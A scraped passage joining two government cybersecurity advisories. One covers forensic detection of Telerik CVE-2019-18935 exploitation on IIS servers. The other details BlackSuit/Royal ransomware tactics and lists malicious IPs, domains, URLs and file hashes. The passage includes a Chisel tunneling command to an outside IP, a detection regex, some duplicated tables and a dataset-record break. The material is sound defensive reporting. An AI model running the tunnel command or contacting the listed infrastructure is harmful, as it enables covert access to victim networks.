Create one of the DLL files (C:\Windows\Temp\1665890187.8690152.dll) by process w3wp.exe PID 6484.
Load the newly created DLL into a currently running IIS process, w3wp.exe PID 6484. 
Make a TCP connection using w3wp.exe PID 6484 to 45.77.212,.,12 over port 443.
Invoke C:\Windows\System32\vcruntime140.dll (Windows C runtime library) to execute payload.

Steps 1 and 2 occur every time a malicious DLL file is created. In some cases, an ASP .NET temp file was created, but this may have indicated benign IIS server activity. Note: The Process ID (PID) used in this example is unique to this investigation and is not universal. IP address 45.77.212,.,12 correlates to TA1, but the pattern can be used as general practice to identify similar activity.
Additional Searching for IIS Servers
The following information was derived from artifact analysis and is provided to equip IT infrastructure defenders searching for similar activity on an IIS server. Several artifacts can be referenced to assist in determining if CVE-2019-18935 has been successfully exploited.
File Type: DLL
Location: - %SystemDrive%\Windows\Temp\
When this CVE is exploited, it uploads malicious DLL files to the C:\Windows\Temp\ directory. The malicious DLL file naming convention translates to the exact time the file was uploaded to the server.
The time is represented in a series of digits, known as Unix Epoch time. The files observed during this investigation contained two sets of digits separated by a period (.) before the DLL extension (.dll). Example: 1667206973.2270932.dll
Nearly all recovered files contain a series of 10 digits to the left of the period (.) and seven digits to the right. However, one file contained only five digits in the second set, which should be taken into consideration when writing regex patterns to search for the existence of these files. Example Regex: \d{10}\.\d{1,8}\.dll
These numbers can be copied and translated from digits into readable language with the month, day, year, hour, minute, and seconds displayed.
Log Type: IIS
Location: - %SystemDrive%\inetpub\logs\LogFiles
When investigating IIS logs, specific fields were searched for and captured during the time of each connection.
If the Unix Epoch time signature has been translated from a DLL filename, specific logs can be searched based on that time. However, if the Unix Epoch time signature has not been translated, the following will still work, but may take longer for the query to run.
The four most important fields to identify this traffic are noted in the following table. These descriptions are sourced directly from Microsoft.,7,

Note: Depending on how logs are collected and stored, the field names may not be an exact match; this should be taken into consideration when constructing queries.
When ingesting logs into security information and event management (SIEM), the final field names did not use a hyphen (-) but used an underscore (_).
Example: cs_method instead of cs-method
Artifacts:

When reviewing logs, two IIS events were observed with the same timestamp each time this CVE-2019-18935 was exploited. Both events contained the same information in the cs-method, cs-uri-stem, and cs-uri-query. One event had a sc-status of 200 and the other had a sc-status of 302.
Log Type: Windows Event Application Logs
Location: -%SystemDrive%\Windows\System32\winevt\logs\Application.evtx
Kroll Artifact Parser and Extractor (KAPE), a forensic artifact collector and parser, was used to extract the Windows event logs from a backup image of the compromised IIS server. All field names refer to the labels provided via KAPE exports. The strings are of value and can be used to locate other artifacts if different tools are used. Note: The payload data in the following table has been shortened to only necessary strings to obscure and protect victim information.

Authoring organizations recommend looking for the following key strings in the payload:

w3wp.exe: This is the parent process that executes the code inside the malicious DLLs.
System.Configuration.Install.AssemblyInstaller: Figure 1 is from the creator’s GitHub repo,8, where the string can be observed in the code. As presented by Bishop Fox and proven during authoring organizations’ investigation of IIS server logs, an exception does not mean that the exploit failed, but more likely that it executed successfully.,4,


 

Figure 1: Threat Actor Assembly Installer

If a Werfault crash report was written, Windows event application logs may contain evidence of this— even if the DLLs have been removed from the system as part of a cleanup effort by the threat actors.

The EventID field maps to Windows EventIDs for an easy filter. Users can leverage the Windows EventIDs to find malicious DLL with the Unix Epoch time-based name inside the C:\Windows\Temp\ directory.
Depending how log analysis is performed, various filters can be determined. However, if regex is available, the example listed in Table 14 above can be reused to match the Unix Epoch timestamp convention to assist in filtering.
Additional Analysis
When evidence of malicious DLLs is found, reverse engineering will need to be conducted to fully understand what actions occur as the malicious files could do nearly anything. Leveraging Windows security event logs, as well as Windows PowerShell logs, may provide insight into what actions the DLLs are taking. CISA and authoring organizations recommend the following process:

Convert any discovered malicious DLL timestamps to readable format.
Export the Windows security event and PowerShell logs from the device.

Default path: %SystemDrive%\Windows\System32\winevt\logs\Windows PowerShell
Default path: %SystemDrive%\Windows\System32\winevt\logs\Security.evtx


Filter based on identified timestamps.
Search for new processes created via w3wp.exe in Windows security event logs (e.g., Windows EventID 4688 New Process created).
Search for new PIDs from identified events. Investigate to determine if they spawned any other processes.

Example: CMD.EXE launching PowerShell or running other commands such as nslookup or netstat. Note: This is not an exhaustive list.


Search for EventID 600 in PowerShell logs.

Trellix XDR Platform Searching
If Trellix XDR Platform is deployed in an environment and a standard HX triage audit is completed in a timely manner of the suspected use of CVE-2019-18935, an organization can search for file write events from known web processes. This will identify the executables written by the web server process. CISA and authoring organizations specifically recommend searching for the following field value pair:

MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Manage Vulnerabilities and Configurations

Upgrade all instances of Telerik UI ASP.NET AJAX to the latest version after appropriate testing. Keep all software up to date and prioritize patching to known exploited vulnerabilities (KEVs).,CPG 5.1,
Prioritize remediation of vulnerabilities on internet-facing systems. For additional guidance, see CISA Insights - Remediate Vulnerabilities for Internet-Accessible Systems.,CPG 5.1,
Implement a patch management solution to ensure compliance with the latest security patches. A patch management solution that inventories all software running in addition to vulnerability scanning is recommended.
Ensure vulnerability scanners are configured to scan a comprehensive scope of devices and locations. For example, as noted in the Technical Details section, the victim organization had the appropriate plugin for CVE-2019-18935, but the vulnerability went undetected due to the Telerik UI software being installed in a file path not typically scanned. To identify unpatched instances of software vulnerabilities, organizations using vulnerability scanners should be aware that all installations may not be considered “typical” and may require full file scans of web applications.

Note: Vulnerability scanners may have limitations in detecting vulnerabilities, such as only being able to identify Windows Installer-installed applications, which was the case with this agency’s vulnerability scanner. The Telerik UI software was installed via a continuous integration (CI) and continuous delivery (CD) pipeline rather than the Windows Installer. This highlights the importance of using a comprehensive approach for vulnerability scanning that considers all potential installation methods and file paths.


Validate output from patch management and vulnerability scanning solutions against running services to check for discrepancies and account for all services.

 Segment Networks Based on Function

Implement network segmentation to separate network segments based on role and functionality. Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. (See CISA’s Layering Network Security Through Segmentation infographic and the National Security Agency’s Segment Networks and Deploy Application-Aware Defenses.),CPG 8.1,
Isolate similar systems and implement micro-segmentation with granular access and policy restrictions to modernize cybersecurity and adopt zero trust principles for both network perimeter and internal devices. Logical and physical segmentation are critical to limiting and preventing lateral movement, privilege escalation, and exfiltration. Utilize access control lists (ACLs), hardened firewalls, and network monitoring devices to regulate, monitor, and audit cross-segment access and data transfers.

Other Best Practice Mitigation Recommendations

Implement phishing-resistant multifactor authentication (MFA) for as many services possible—particularly for webmail, virtual private networks (VPNs), accounts that access critical systems, and privileged accounts that manage backups.

MFA can still be leveraged for secure access using a jump server—an asset placed between the external and internal networks that serves as an intermediary for access—to facilitate connections if assets do not have the capability to support MFA implementation.
For additional guidance on secure MFA configurations, visit cisa.gov/mfa.,CPG 1.3,


Monitor and analyze activity logs generated from Microsoft IIS and remote PowerShell. Collect access and security focused logs (IDS/IDPS, firewall, DLP, VPN) and ensure logs are securely stored for a specified duration informed by risk or pertinent regulatory guidance.,CPG 3.1, 3.2,

Evaluate user permissions and maintain separate user accounts for all actions and activities not associated with the administrator role, e.g., for business email, web browsing, etc. All privileges should be reevaluated on a recurring basis to validate continued need for a given set of permissions.,CPG 1.5,


Limit service accounts to the minimum permissions necessary to run services. CISA observed numerous error messages in network logs indicative of failed attempts to write files to additional directories or move laterally.
Maintain a robust asset management policy through comprehensive documentation of assets, tracking current version information to maintain awareness of outdated software, and mapping assets to business and critical functions.

Determine the need and functionality of assets that require public internet exposure.,CPG 2.3,



VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA, FBI, and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and co-sealers recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 5-10).
Align your security technologies against the selected technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program—including people, processes, and technologies—based on the data generated by this process.

CISA, FBI, and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES
UNIX Timestamp Converter
REFERENCES,1, Telerik: Exploiting .NET JavaScriptSerializer Deserialization (CVE-2019-18935),2, Exploit Database: Proof-of-Concept Exploit for CVE-2017-9248,3, ACSC Advisory 2020-004,4, Bishop Fox CVE-2019-18935: Remote Code Execution via Insecure Deserialization in Telerik UI,5, Volexity Threat Research: XE Group,6, GitHub: Proof-of-Concept Exploit for CVE-2019-18935,7, Microsoft: Configure Logging in IIS,8, GitHub: CVE-2019-18935
ACKNOWLEDGEMENTS
Google’s Threat Analysis Group (TAG) contributed to this CSA.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a
32,"






Actions for Organizations to Take Today to Mitigate Cyber Threats Related to BlackSuit Ransomware Activity




Prioritize remediating known exploited vulnerabilities.
Train users to recognize and report phishing attempts.
Enable and enforce multifactor authentication.







Summary
Note: This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
Note: This advisory, originally published March 2, 2023, has been updated four times:

November 13, 2023: The advisory was updated to share new Royal TTPs and IOCs.
August 7, 2024: The advisory was updated to notify network defenders of the rebrand of “Royal” ransomware actors to “BlackSuit.” The update includes new TTPs, IOCs, and detection methods related to BlackSuit ransomware. “Royal” was updated to “BlackSuit” throughout unless referring to legacy Royal activity. Updates and new content are noted.
August 14, 2024: The STIX files from the previous update (08/07/2024) were refreshed.
August 27, 2024: The STIX files from the (08/19/2024) update were refreshed.

(New August 7, 2024) The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint advisory to disseminate known BlackSuit ransomware IOCs and TTPs identified through FBI threat response activities and third-party reporting as recently as of July 2024. BlackSuit ransomware is the evolution of the ransomware previously identified as Royal ransomware, which was used from approximately September 2022 through June 2023. BlackSuit shares numerous coding similarities with Royal ransomware and has exhibited improved capabilities. 
(Updated August 7, 2024) BlackSuit conducts data exfiltration and extortion prior to encryption and then publishes victim data to a leak site if a ransom is not paid. Phishing emails are among the most successful vectors for initial access by BlackSuit threat actors. After gaining access to victims’ networks, BlackSuit actors disable antivirus software and exfiltrate large amounts of data before ultimately deploying the ransomware and encrypting the systems. 
(Updated August 7, 2024) Ransom demands have typically ranged from approximately $1 million to $10 million USD, with payment demanded in Bitcoin. BlackSuit actors have demanded over $500 million USD in total and the largest individual ransom demand was $60 million. BlackSuit actors have exhibited a willingness to negotiate payment amounts. Ransom amounts are not part of the initial ransom note, but require direct interaction with the threat actor via a .onion URL (reachable through the Tor browser) provided after encryption. Recently, an uptick was observed in the number of instances where victims received telephonic or email communications from BlackSuit actors regarding the compromise and ransom. BlackSuit uses a leak site to publish victim data based on non-payment.
FBI and CISA encourage organizations to implement the recommendations found in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report:


AA23-061A #StopRansomware: BlackSuit (Royal) Ransomware
(PDF,       660.84 KB
  )


For a downloadable copy of IOCs, see:


AA23-061A STIX XML (MAR 2023)
(XML,       114.26 KB
  )




AA23-061A STIX XML (NOV 2023 Update)
(XML,       152.94 KB
  )




AA23-061A STIX JSON (NOV 2023 Update)
(JSON,       113.96 KB
  )




AA23-061A STIX XML (BlackSuit)
(XML,       242.82 KB
  )




AA23-061A STIX JSON (BlackSuit)
(JSON,       162.62 KB
  )


Technical Details
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 15. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Initial Access
BlackSuit uses a unique partial encryption approach that allows the threat actor to choose a specific percentage of data in a file to encrypt. This approach allows the actor to lower the encryption percentage for larger files, which helps evade detection, and also significantly improves ransomware speed.[1] In addition to encrypting files, BlackSuit actors also engage in double extortion tactics in which they threaten to publicly release the exfiltrated data if the victim does not pay the ransom.
BlackSuit actors gain initial access to victim networks in several ways, including:

Phishing. According to third-party reporting, BlackSuit actors most commonly gain initial access to victim networks via phishing emails [T1566].

According to open source reporting, victims have unknowingly installed malware that delivers BlackSuit ransomware after receiving phishing emails containing malicious PDF documents [T1566.001] and malvertising [T1566.002].[2]


Remote Desktop Protocol (RDP). The second most common vector (around 13.3% of incidents) BlackSuit actors use for initial access is RDP compromise [T1021.001]. 
Public-facing applications. FBI has observed BlackSuit actors gain initial access through exploiting vulnerable public-facing applications [T1190].
Brokers. Reports from trusted third-party sources indicate that BlackSuit actors may leverage initial access brokers to gain initial access and source traffic by harvesting virtual private network (VPN) credentials from stealer logs [T1650].

Command and Control
Once BlackSuit actors gain access to a network, they communicate with command and control (C2) infrastructure and download multiple tools [T1105]. Legitimate Windows software is repurposed by BlackSuit actors to strengthen their foothold within the victim’s network. Ransomware operators often use open source projects to aid their intrusion activities.
Historically, Royal actors were observed leveraging Chisel, Secure Shell (SSH) client, PuTTY, OpenSSH, and MobaXterm [T1572], to communicate with their C2 infrastructure.
Lateral Movement and Persistence
(Updated August 7, 2024) Historically, Royal threat actors used RDP and legitimate operating system (OS) diagnostic tools to move laterally across a network [T1021.001]. BlackSuit actors used RDP and PsExec as well but also use SMB [T1021.001] to move laterally. In one confirmed case, BlackSuit actors used a legitimate admin account [T1078] to remotely log on to the domain controller via SMB. Once on the domain controller, the threat actor deactivated antivirus software [T1562.001] by modifying Group Policy Objects [T1484.001].
(Updated August 7, 2024) FBI observed BlackSuit actors using legitimate remote monitoring and management (RMM) software to maintain persistence in victim networks [T1133]. 
(New August 7, 2024) BlackSuit actors use SystemBC and Gootloader malware to load additional tools and maintain persistence.
Discovery and Credential Access
(New August 7, 2024) BlackSuit actors have been observed using SharpShares and SoftPerfect NetWorx to enumerate victim networks. The publicly available credential stealing tool Mimikatz and password harvesting tools from Nirsoft have also been found on victim systems. Tools such as PowerTool and GMER are often used to kill system processes.
Exfiltration
BlackSuit actors exfiltrate data from victim networks by repurposing legitimate cyber penetration testing tools, such as Cobalt Strike, and malware tools/derivatives, such as Ursnif/Gozi, for data aggregation and exfiltration. According to third-party reporting, BlackSuit actors’ first hop in exfiltration and other operations is usually a U.S. IP address. 
(New August 7, 2024) BlackSuit actors also use RClone and Brute Ratel for exfiltration.
Encryption
Before starting the encryption process, BlackSuit actors:

Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [T1486].[1]
Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to inhibit system recovery.[1]

FBI has found numerous batch (.bat) files on impacted systems which are typically transferred as an encrypted 7zip file. Batch files create a new admin user [T1078.002], force a group policy update, set pertinent registry keys to auto-extract [T1119] and execute the ransomware, monitor the encryption process, and delete files upon completion—including Application, System, and Security event logs [T1070.001]. Registry Keys created can be modified and deleted to enable persistence on the victim’s system. 
Malicious files have been found in victim networks in the following directories:

C:\Temp\
C:\Users\<user>\AppData\Roaming\
C:\Users\<users>\
C:\ProgramData\

Root C:\ directory has also served as a storage location for malicious files. BlackSuit actors have been observed using legitimate software and open source tools during ransomware operations.
Indicators of Compromise (IOCs)
See Table 1 through Table 5 for Royal ransomware IOCs obtained by FBI during threat response activities as of January 2023.
(New November 13, 2023) See Table 6 and Table 7 for Royal and BlackSuit Ransomware IOCs as of June 2023. See Table 8 for a list of legitimate software used by Royal and BlackSuit threat actors identified through FBI investigations as of June 2023.
(New August 7, 2024) See Table 9 through Table 15 for BlackSuit ransomware IOCs obtained by FBI during threat response activities as of July 2024 and Figure 1 for a sample ransom note.
Disclaimer: Some of the observed IP addresses are several years old. FBI and CISA recommend vetting or investigating these IP addresses prior to taking forward-looking action, such as blocking.
Royal IOCs as of January 2023


Table 1: Royal Ransomware Associated Files as of January 2023


IOC
Description




.royal
Encrypted file extension


README.TXT
Ransom note






Table 2: Royal Ransomware Associated IP addresses as of January 2023


Malicious IP
Last Observed Activity




102.157.44[.]105
November 2022


105.158.118[.]241
November 2022


105.69.155[.]85
November 2022


113.169.187[.]159
November 2022


134.35.9[.]209
November 2022


139.195.43[.]166
November 2022


139.60.161[.]213
November 2022


148.213.109[.]165
November 2022


163.182.177[.]80
November 2022


181.141.3[.]126
November 2022


181.164.194[.]228
November 2022


185.143.223[.]69
November 2022


186.64.67[.]6
November 2022


186.86.212[.]138
November 2022


190.193.180[.]228
November 2022


196.70.77[.]11
November 2022


197.11.134[.]255
November 2022


197.158.89[.]85
November 2022


197.204.247[.]7
November 2022


197.207.181[.]147
November 2022


197.207.218[.]27
November 2022


197.94.67[.]207
November 2022


23.111.114[.]52
November 2022


41.100.55[.]97
November 2022


41.107.77[.]67
November 2022


41.109.11[.]80
November 2022


41.251.121[.]35
November 2022


41.97.65[.]51
November 2022


42.189.12[.]36
November 2022


45.227.251[.]167
November 2022


5.44.42[.]20
November 2022


61.166.221[.]46
November 2022


68.83.169[.]91
November 2022


81.184.181[.]215
November 2022


82.12.196[.]197
November 2022


98.143.70[.]147
November 2022


140.82.48[.]158
December 2022


147.135.36[.]162
December 2022


147.135.11[.]223
December 2022


152.89.247[.]50
December 2022


172.64.80[.]1
December 2022


179.43.167[.]10
December 2022


185.7.214[.]218
December 2022


193.149.176[.]157
December 2022


193.235.146[.]104
December 2022


209.141.36[.]116
December 2022


45.61.136[.]47
December 2022


45.8.158[.]104
December 2022


5.181.234[.]58
December 2022


5.188.86[.]195
December 2022


77.73.133[.]84
December 2022


89.108.65[.]136
December 2022


94.232.41[.]105
December 2022


47.87.229[.]39
January 2023





Table 3: Royal Ransomware Associated Domains as of January 2023


Malicious Domain
Last Observed Activity




sombrat[.]com
October 2022


gororama[.]com
November 2022


softeruplive[.]com
November 2022


altocloudzone[.]live
December 2022


ciborkumari[.]xyz
December 2022


myappearinc[.]com
December 2022


parkerpublic[.]com
December 2022


pastebin.mozilla[.]org/Z54Vudf9/raw
December 2022


tumbleproperty[.]com
December 2022


myappearinc[.]com/acquire/draft/c7lh0s5jv
January 2023





Table 4: Tools Used by Royal Operators


Tool
SHA256




AV tamper
8A983042278BC5897DBCDD54D1D7E3143F8B7EAD553B5A4713E30DEFFDA16375


TCP/UDP Tunnel over HTTP (Chisel)
8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451


Ursnif/Gozi
be030e685536eb38ba1fec1c90e90a4165f6641c8dc39291db1d23f4ee9fa0b1


Exfil
B8C4AEC31C134ADBDBE8AAD65D2BCB21CFE62D299696A23ADD9AA1DE082C6E20


Remote Access (AnyDesk)
4a9dde3979c2343c024c6eeeddff7639be301826dd637c006074e04a1e4e9fe7


PowerShell Toolkit Downloader
4cd00234b18e04dcd745cc81bb928c8451f6601affb5fa45f20bb11bfb5383ce


PsExec (Microsoft Sysinternals)
08c6e20b1785d4ec4e3f9956931d992377963580b4b2c6579fd9930e08882b1c


Keep Host Unlocked (Don’t Sleep)
f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee


Ransomware Executable
d47d4b52e75e8cf3b11ea171163a66c06d1792227c1cf7ca49d7df60804a1681


Windows Command Line (NirCmd)
216047C048BF1DCBF031CF24BD5E0F263994A5DF60B23089E393033D17257CB5


System Management (NSudo)
19896A23D7B054625C2F6B1EE1551A0DA68AD25CDDBB24510A3B74578418E618


AV tamper
8A983042278BC5897DBCDD54D1D7E3143F8B7EAD553B5A4713E30DEFFDA16375


TCP/UDP Tunnel over HTTP (Chisel)
8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451


Ursnif/Gozi
be030e685536eb38ba1fec1c90e90a4165f6641c8dc39291db1d23f4ee9fa0b1


Exfil
B8C4AEC31C134ADBDBE8AAD65D2BCB21CFE62D299696A23ADD9AA1DE082C6E20


Remote Access (AnyDesk)
4a9dde3979c2343c024c6eeeddff7639be301826dd637c006074e04a1e4e9fe7


PowerShell Toolkit Downloader
4cd00234b18e04dcd745cc81bb928c8451f6601affb5fa45f20bb11bfb5383ce


PsExec (Microsoft Sysinternals)
08c6e20b1785d4ec4e3f9956931d992377963580b4b2c6579fd9930e08882b1c


Keep Host Unlocked (Don’t Sleep)
f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee


Ransomware Executable
d47d4b52e75e8cf3b11ea171163a66c06d1792227c1cf7ca49d7df60804a1681


Windows Command Line (NirCmd)
216047C048BF1DCBF031CF24BD5E0F263994A5DF60B23089E393033D17257CB5


System Management (NSudo)
19896A23D7B054625C2F6B1EE1551A0DA68AD25CDDBB24510A3B74578418E618






 


Table 5: Batch Script Tools Used by Royal Operators


File name
Hash Value




2.bat
585b05b290d241a249af93b1896a9474128da969


3.bat
41a79f83f8b00ac7a9dd06e1e225d64d95d29b1d


4.bat
a84ed0f3c46b01d66510ccc9b1fc1e07af005c60


8.bat
c96154690f60a8e1f2271242e458029014ffe30a


kl.bat
65dc04f3f75deb3b287cca3138d9d0ec36b8bea0


gp.bat
82f1f72f4b1bfd7cc8afbe6d170686b1066049bc7e5863b51aa15ccc5c841f58


r.bat
74d81ef0be02899a177d7ff6374d699b634c70275b3292dbc67e577b5f6a3f3c


runanddelete.bat
342B398647073159DFA8A7D36510171F731B760089A546E96FBB8A292791EFEE




Royal and BlackSuit IOCs as of June 2023 (New November 13, 2023)


Table 6: Royal Ransomware Associated Files, Tools, and Hashes as of June 2023


Name
Description or SHA 256 Hash Value




C:\Users\Public\conhost.exe client 149.28.73.161:443 R:149.28.73.161:43657:socks
Executed on the victim’s machine, uses a Chisel client to tunnel traffic through port 443 instead of port 43657.


royal_w
Encryption extension


%PROGRAMDATA%
Ransomware Filepath


%TEMP%\execute.bat
 


InstallerV20.8.msi
 


windows_encryptor.exe
85087f28a84205e344d7e8e06979e6622fab0cfe1759fd24e38cd0390bca5fa6


%PROGRAMDATA%\wine.exe
5b08c02c141eab94a40b56240a26cab7ff07e9a6e760dfde8b8b053a3526f0e6


%USERPROFILE%\Downloads\run1.bat
bc609cf53dde126b766d35b5bcf0a530c24d91fe23633dad6c2c59fd1843f781


%USERPROFILE%\Downloads\run2.bat
13c25164791d3436cf2efbc410caec6b6dd6978d7e83c4766917630e24e1af10


%USERPROFILE%\Downloads\run3.bat
2b93206d7a36cccdf7d7596b90ead301b2ff7e9a96359f39b6ba31bb13d11f45


%USERPROFILE%\Downloads\run4.bat
84e1efbed6bb7720caea6720a8bff7cd93b5d42fb1d71ef8031bfd3897ed4435


%USERPROFILE%\Downloads\sc.bat
e0dbe3a2d07ee10731b68a142c65db077cfb88e5ec5c8415e548d3ede40e7ffc


%USERPROFILE%\Downloads\sr.bat
34a98f2b54ebab999f218b0990665485eb2bb74babdf7e714cc10a306616b00c


runanddelete.bat
342b398647073159dfa8a7d36510171f731b760089a546e96fbb8a292791efee


scripttodo.ps1 (94.232.41.105)
4cd00234b18e04dcd745cc81bb928c8451f6601affb5fa45f20bb11bfb5383ce


dontsleep.exe
f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee


wstart.exe
d47d4b52e75e8cf3b11ea171163a66c06d1792227c1cf7ca49d7df60804a1681


InstallerV8.1.ms
3e6e2e0de75896033d91dfd07550c478590ca4cd4598004d9e19246e8a09cb97


shutdowni.bat
8a983042278bc5897dbcdd54d1d7e3143f8b7ead553b5a4713e30deffda16375


f827.exe
5654f32a4f0f2e900a35761e8caf7ef0c50ee7800e0a3b19354b571bc6876f61


d2ef5.exe
be030e685536eb38ba1fec1c90e90a4165f6641c8dc39291db1d23f4ee9fa0b1


f24dc8ea.msi
91605641a4c7e859b7071a9841d1cd154b9027e6a58c20ec4cadafeaf47c9055


defw10.bat
fb638dba20e5fec72f5501d7e0627b302834ec5eaf331dd999763ee925cbc0f9


ll.exe
f0197bd7ccd568c523df9c7d9afcbac222f14d344312322c04c92e7968859726


Royal Ransomware Hash
b987f738a1e185f71e358b02cafa5fe56a4e3457df3b587d6b40e9c9de1da410


b34v2.dll
a51b1f1f0636bff199c0f87e2bb300d42e06698b


1.exe
d93f1ef533e6b8c95330ba0962e3670eaf94a026


34.dll
9e19afc15c5781e8a89a75607578760aabad8e65


ll.exe
9a92b147cad814bfbd4632b6034b8abf8d84b1a5


Royal Ransomware Hash
a4ef01d55e55cebdd37ba71c28b0c448a9c833c0






Table 7: BlackSuit Ransomware Associated Files, Tools, and Hashes as of June 2023


IP Address 
MD5 Hash Value




sys32.exe
30cc7724be4a09d5bcd9254197af05e9fab76455


esxi_encryptor
861793c4e0d4a92844994b640cc6bc3e20944a73




BlackSuit threat actors have been observed using legitimate software and open source tools during ransomware operations. Threat actors have been observed using open source network tunneling tools such as Chisel and Cloudflared, as well as Secure Shell (SSH) Client, OpenSSH, and MobaXterm to establish SSH connections. The publicly available credential stealing tool Mimikatz and password harvesting tools from Nirsoft have also been found on victim systems. Legitimate RMM tools have also been observed as backdoor access vectors. Some legitimate software and open source tools can be found in Table 8.


Table 8: Legitimate Files and Tools Used by Royal and BlackSuit Ransomware


Name
Description or SHA 256 Hash Value





C:\Program Files\OpenSSH\ssh-agent.exe
C:\Program Files\OpenSSH\sshd.exe

SSH Client


%USERPROFILE%\Downloads\WinRAR.exe
Compression tool


%APPDATA%\MobaXterm\
Toolbox for remote computing


\Program Files (x86)\Mobatek\
Toolbox for remote computing


\Program Files (x86)\Mobatek\MobaXterm\
Toolbox for remote computing


b34v2.dll
ColbaltStrike Beacon


34.dll
CobaltStrike Beacon


mimikatz.exe
Mimikatz credential harvester


dialuppass.exe
Nirsoft password harvesting utility


iepv.exe
Nirsoft password harvesting utility


mailpv.exe
Nirsoft password harvesting utility


netpass.exe
Nirsoft password harvesting utility


routerpassview.exe
Nirsoft password harvesting utility


AdFind.exe
ADFind tool


LogMeIn
Remote access tool


Atera
Remote access tool


C:\Program Files\Eraser\Eraser.exe
Anti-Forensics Tool used by TA


advanced_ip_scanner.exe
Reconnaissance Tool used by TA


conhost.exe (chisel_windows_1_7_7.exe)
b9ef2e948a9b49a6930fc190b22cbdb3571579d37a4de56564e41a2ef736767b


%USERPROFILE%\Downloads\svvhost.exe\Users\Administrator\AppData\Local\Temp\cloudflared.exe
c429719a45ca14f52513fe55320ebc49433c729a0d2223479d9d43597eab39fa


nircmd.exe
216047c048bf1dcbf031cf24bd5e0f263994a5df60b23089e393033d17257cb5


nsudo.exe
19896a23d7b054625c2f6b1ee1551a0da68ad25cddbb24510a3b74578418e618




IOCs as of July 2024 (New August 7, 2024)
Disclaimer: Several of these observed IP addresses were first observed as early as 2023, although the most recent are from July of 2024 and have been historically linked to BlackSuit (formerly known as Royal) Ransomware. IP addresses in this advisory were maliciously used during the time range highlighted below, and may have been used for legitimate purposes outside of that time span. FBI and CISA recommend these IP addresses be investigated or vetted by organizations prior to taking action, such as blocking.


Table 9: Malicious URL (s) associated with BlackSuit Ransomware


URL Association
Malicious URLs




URLs from malicious PowerShell on P0, potentially debug.ps1

https://1tvnews[.]af/xmlrpc.php
https://avpvuurwerk[.]nl/xmlrpc.php
https://beautyhabits[.]gr/xmlrpc.php
https://interpolyaris[.]ru/xmlrpc.php
https://libertygospeltracts[.]com/xmlrpc.php
https://oldtimertreffen-rethem[.]de/xmlrpc.php
https://parencyivf[.]com/xmlrpc.php
https://pikaluna[.]com/xmlrpc.php
https://stroeck[.]at/xmlrpc.php



URL associated to BRC4 / Brute Ratel
megupdate[.]com


URLs associated to Exfiltration
mystuff[.]bublup[.]com 


URL associated to Cobalt Strike C2
provincial-gaiters-gw[.]aws-use1[.]cloud-ara[.]tyk[.]io


URL associated to Initial Access Download
zoommanager[.]com





Table 10: BlackSuit Ransomware Associated Files and Hash Values


Filename
Hash Value – SHA-256
Description




1.exe
af9f95497b8503af1a399bc6f070c3bbeabc5aeecd8c09bca80495831ae71e61
Encryptor


PowerTool64.exe
 
Hacktool


aaa.exe
C4A2227CD8D85128EAFEF8EE2298AA105DA892C8B0F37405667C2D1647C35C46
Encryptor


 aaa.exe
8d16a23d5a5630502b09c33fbc571d2261c6c98fecc3a79a1e1129354f930d0a
 


Wen.exe
01ce9cfebb29596d0ab7c99e8dbadf1a8409750b183e6bf73e0de021b365be13
 


etmc.exe
a0a4a99948e12309f54911264261d96f0e40d5fd695bab82e95fbc1f9024482e
 


svchost.exe
9bbc9784ce3c818a127debfe710ec6ce21e7c9dd0daf4e30b8506a6dba533db4
Data Exfiltration Tool ­– Renamed version of RClone.exe


locker_N1uYkmEsfoHmT4lK66trUjBuy5gyAj7n.ex_
146335b1be627318ac09476f0c8f8e6e027805e6077673f72d6dce1677a24c78
 


socks32.exe
9493b512d7d15510ebee5b300c55b67f9f2ff1dda64bddc99ba8ba5024113300
 


C:\users\Administrator\AppData\Local\msa.ps1
 
SystemBC backdoor


%APPDATA%\ Zoom\Alternative Workplace Strategies.js
E813F8FAF3AA2EB20E285596413F5088B2D7FD153FE9F72F3FF45735D0FDDCED
Gootloader infection


C:\Users\Public\socks.ps1
25A6F82936134A6C5C0066F382530B9D6BF2C8DA6FEAFE028F166B1A9D7283CF

PowerShell Backdoor
 



